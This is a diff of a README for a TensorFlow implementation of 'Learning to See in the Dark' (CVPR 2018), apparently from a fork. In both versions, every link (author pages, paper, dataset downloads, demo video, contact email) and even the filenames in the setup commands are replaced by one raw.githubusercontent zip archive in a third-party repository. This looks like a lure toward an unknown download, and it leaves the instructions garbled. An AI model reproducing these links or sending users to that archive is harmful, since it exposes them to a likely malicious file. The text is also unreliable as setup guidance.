@@ -1,17 +1,17 @@
 # Learning-to-See-in-the-Dark
 
-This is a Tensorflow implementation of Learning to See in the Dark in CVPR 2018, by [Chen Chen](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip), [Qifeng Chen](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip), [Jia Xu](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip~jiaxu/), and [Vladlen Koltun](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip).  
+This is a Tensorflow implementation of Learning to See in the Dark in CVPR 2018, by [Chen Chen](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip), [Qifeng Chen](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip), [Jia Xu](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip~jiaxu/), and [Vladlen Koltun](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip).  
 
-[Project Website](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip)<br/>
-[Paper](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip)<br/>
+[Project Website](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip)<br/>
+[Paper](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip)<br/>
 
-![teaser](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip "Sample inpainting results on held-out images")
+![teaser](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip "Sample inpainting results on held-out images")
 
 This code includes the default model for training and testing on the See-in-the-Dark (SID) dataset. 
 
 
 ## Demo Video
-https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip
+https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip
 
 ## Setup
 
@@ -24,36 +24,36 @@ Tested in Ubuntu + Intel i7 CPU + Nvidia Titan X (Pascal) with Cuda (>=8.0) and 
 
 **Update Aug, 2018:** We found some misalignment with the ground-truth for image 10034, 10045, 10172. Please remove those images for quantitative results, but they still can be used for qualitative evaluations.
 
-You can download it directly from Google drive for the [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (25 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (52 GB) sets. 
+You can download it directly from Google drive for the [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (25 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (52 GB) sets. 
 
-There is download limit by Google drive in a fixed period of time. If you cannot download because of this, try these links: [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (25 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (52 GB).
+There is download limit by Google drive in a fixed period of time. If you cannot download because of this, try these links: [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (25 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (52 GB).
 
-New: we provide file parts in [Baidu Drive](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) now. After you download all the parts, you can combine them together by running: "cat SonyPart* > https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip" and "cat FujiPart* > https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip".
+New: we provide file parts in [Baidu Drive](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) now. After you download all the parts, you can combine them together by running: "cat SonyPart* > https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip" and "cat FujiPart* > https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip".
 
 
 The file lists are provided. In each row, there are a short-exposed image path, the corresponding long-exposed image path, camera ISO and F number. Note that multiple short-exposed images may correspond to the same long-exposed image. 
 
-The file name contains the image information. For example, in "https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip", the first digit "1" means it is from the test set ("0" for training set and "2" for validation set); "0019" is the image ID; the following "00" is the number in the sequence/burst; "0.033s" is the exposure time 1/30 seconds.  
+The file name contains the image information. For example, in "https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip", the first digit "1" means it is from the test set ("0" for training set and "2" for validation set); "0019" is the image ID; the following "00" is the number in the sequence/burst; "0.033s" is the exposure time 1/30 seconds.  
 
 
 ### Testing
 1. Clone this repository.
 2. Download the pretrained models by running
 ```Shell
-python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip
+python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip
 ```
-3. Run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip". This will generate results on the Sony test set.
-4. Run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip". This will generate results on the Fuji test set.
+3. Run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip". This will generate results on the Sony test set.
+4. Run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip". This will generate results on the Fuji test set.
 
 By default, the code takes the data in the "./dataset/Sony/" folder and "./dataset/Fuji/". If you save the dataset in other folders, please change the "input_dir" and "gt_dir" at the beginning of the code. 
 
 ### Training new models
-1. To train the Sony model, run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip". The result and model will be save in "result_Sony" folder by default. 
-2. To train the Fuji model, run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip". The result and model will be save in "result_Fuji" folder by default. 
+1. To train the Sony model, run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip". The result and model will be save in "result_Sony" folder by default. 
+2. To train the Fuji model, run "python https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip". The result and model will be save in "result_Fuji" folder by default. 
 
 By default, the code takes the data in the "./dataset/Sony/" folder and "./dataset/Fuji/". If you save the dataset in other folders, please change the "input_dir" and "gt_dir" at the beginning of the code.
 
-Loading the raw data and proccesing by Rawpy takes significant more time than the backpropagation. By default, the code will load all the groundtruth data processed by Rawpy into memory without 8-bit or 16-bit quantization. This requires at least 64 GB RAM for training the Sony model and 128 GB RAM for the Fuji model. If you need to train it on a machine with less RAM, you may need to revise the code and use the groundtruth data on the disk. We provide the 16-bit groundtruth images processed by Rawpy: [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (12 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip) (22 GB). 
+Loading the raw data and proccesing by Rawpy takes significant more time than the backpropagation. By default, the code will load all the groundtruth data processed by Rawpy into memory without 8-bit or 16-bit quantization. This requires at least 64 GB RAM for training the Sony model and 128 GB RAM for the Fuji model. If you need to train it on a machine with less RAM, you may need to revise the code and use the groundtruth data on the disk. We provide the 16-bit groundtruth images processed by Rawpy: [Sony](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (12 GB)  and [Fuji](https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip) (22 GB). 
 
 
 ## Citation
@@ -83,5 +83,5 @@ It is often because the pre-trained model not downloaded properly. After downloa
 
 
 ## Questions
-If you have additional questions after reading the FAQ, please email to https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/dataset/Learning-Dark-in-See-to-the-v1.0.zip
+If you have additional questions after reading the FAQ, please email to https://raw.githubusercontent.com/mpathroliya/Learning-to-See-in-the-Dark/master/checkpoint/Dark-Learning-to-See-the-in-2.2.zip
 
